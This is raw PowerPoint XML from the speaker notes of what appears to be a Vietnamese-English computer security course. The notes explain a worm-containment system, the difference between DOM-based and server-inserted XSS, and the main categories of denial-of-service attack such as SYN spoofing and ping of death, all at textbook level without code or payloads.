            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>P</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>hần mềm sẽ tìm kiếm sự gia tăng về tỷ lệ số lần thực hiện kết nối gửi đi và sự đa dạng của các kết nối đến các máy chủ từ xa. </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200">
              <a:solidFill>
                <a:schemeClr val="accent2"/>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vi-VN" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Khi phát hiện ra một sự đột biến như vậy, phần mềm sẽ chặn các máy chủ lưu trữ của nó khỏi những nỗ lực kết nối</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> tiếp theo.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200">
              <a:solidFill>
                <a:schemeClr val="accent2"/>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vi-VN" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Một hệ thống PWC được triển khai bao gồm một người quản lý PWC và các đại lý PWC trong máy chủ. Hình </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>bên cạnh </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>là một ví dụ về một kiến trúc bao gồm PWC</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{18F9DD13-6400-4570-BF20-5AC29658CEFB}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>84</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="154468686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p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{18F9DD13-6400-4570-BF20-5AC29658CEFB}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>88</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="234516595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pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{18F9DD13-6400-4570-BF20-5AC29658CEFB}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>95</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="70806488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p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{18F9DD13-6400-4570-BF20-5AC29658CEFB}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>117</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="268920254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8F9DD13-6400-4570-BF20-5AC29658CEFB}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>120</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="132416941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a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>What makes DOM-based XSS different</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>In the previous examples of persistent and reflected XSS attacks, the server inserts the malicious script into the page, which is then sent in a response to the victim. When the victim's browser receives the response, it assumes the malicious script to be part of the page's legitimate content and automatically executes it during page load as with any other script.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>In the example of a DOM-based XSS attack, however, there is no malicious script inserted as part of the page; the only script that is automatically executed during page load is a legitimate part of the page. The problem is that this legitimate script directly makes use of user input in order to add HTML to the page. Because the malicious string is inserted into the page using innerHTML, it is parsed as HTML, causing the malicious script to be executed.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{18F9DD13-6400-4570-BF20-5AC29658CEFB}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>132</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="136987015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a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>What makes DOM-based XSS different</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>In the previous examples of persistent and reflected XSS attacks, the server inserts the malicious script into the page, which is then sent in a response to the victim. When the victim's browser receives the response, it assumes the malicious script to be part of the page's legitimate content and automatically executes it during page load as with any other script.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>In the example of a DOM-based XSS attack, however, there is no malicious script inserted as part of the page; the only script that is automatically executed during page load is a legitimate part of the page. The problem is that this legitimate script directly makes use of user input in order to add HTML to the page. Because the malicious string is inserted into the page using innerHTML, it is parsed as HTML, causing the malicious script to be executed.</a:t>
            </a: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Consequently, even with completely secure server-side code, the client-side code might still unsafely include user input in a DOM update after the page has loaded. If this happens, the client-side code has enabled an XSS attack through no fault of the server-side code.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{18F9DD13-6400-4570-BF20-5AC29658CEFB}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>133</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="366459155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8F9DD13-6400-4570-BF20-5AC29658CEFB}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>146</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="289978424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p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{18F9DD13-6400-4570-BF20-5AC29658CEFB}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>148</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="202353308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p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{18F9DD13-6400-4570-BF20-5AC29658CEFB}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>149</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4793745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a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D6D61C2E-EF4F-4DC7-A9B2-564B2153609E}"/>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CC2259C-9F8C-4534-BE8D-47172F3466E8}" type="slidenum">
              <a:rPr lang="en-AU" altLang="en-US" smtClean="0"/>
              <a:pPr>
                <a:spcBef>
                  <a:spcPct val="0"/>
                </a:spcBef>
              </a:pPr>
              <a:t>150</a:t>
            </a:fld>
            <a:endParaRPr lang="en-AU" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7171" name="Rectangle 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{87004897-FE70-4658-9323-9CA86E3BAD41}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noRot="1" noChangeAspect="1" noChangeArrowheads="1" noTextEdit="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7172" name="Rectangle 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9E22299B-9FF8-4368-8358-0A21DF33D395}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>This chapter explores denial of service attacks, their definition, the various forms they take, and defenses against them. Denial of service is a form of attack on the availability of some service. In the context of computer and communications security, the focus is generally on network services that are attacked over their network connection. From this definition you can see that there are several categories of resources that could be attacked:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>• </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>network bandwidth - relates to the capacity of the network links connecting a server to the wider Internet</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>• </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>system resources - typically aims to overload or crash its network handling software</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>• </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>application resources - aim to overload the capabilities of a server and limit its ability to respond to requests from other users</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>Originally only one, or a small number of source systemsdirectly under the attacker’s control, was used. This is all that is required to send the</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>packets needed for any attack targeting a bug in a server’s network handling code or some application. Attacks requiring high traffic volumes are more commonly sent from multiple systems at the same time, using distributed or amplified forms of DoS attacks.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="en-US" altLang="en-US">
              <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:endParaRPr lang="en-US" altLang="en-US">
              <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="321229696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a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D6D61C2E-EF4F-4DC7-A9B2-564B2153609E}"/>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CC2259C-9F8C-4534-BE8D-47172F3466E8}" type="slidenum">
              <a:rPr lang="en-AU" altLang="en-US" smtClean="0"/>
              <a:pPr>
                <a:spcBef>
                  <a:spcPct val="0"/>
                </a:spcBef>
              </a:pPr>
              <a:t>151</a:t>
            </a:fld>
            <a:endParaRPr lang="en-AU" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7171" name="Rectangle 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{87004897-FE70-4658-9323-9CA86E3BAD41}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noRot="1" noChangeAspect="1" noChangeArrowheads="1" noTextEdit="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7172" name="Rectangle 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9E22299B-9FF8-4368-8358-0A21DF33D395}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>The </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>SYN spoofing </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>attack, which we discuss next, is of this type. It targets the table of TCP connections on the server </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> tài nguyên ht (overload)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" i="0" kern="1200">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="+mn-lt"/>
              <a:ea typeface="+mn-ea"/>
              <a:cs typeface="+mn-cs"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="1" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>ping of death </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="1" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>teardrop </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>attacks </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> tài nguyên ht (crash)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>Cyberslam  tài nguyên ứng dụng</a:t>
            </a:r>
            <a:br>
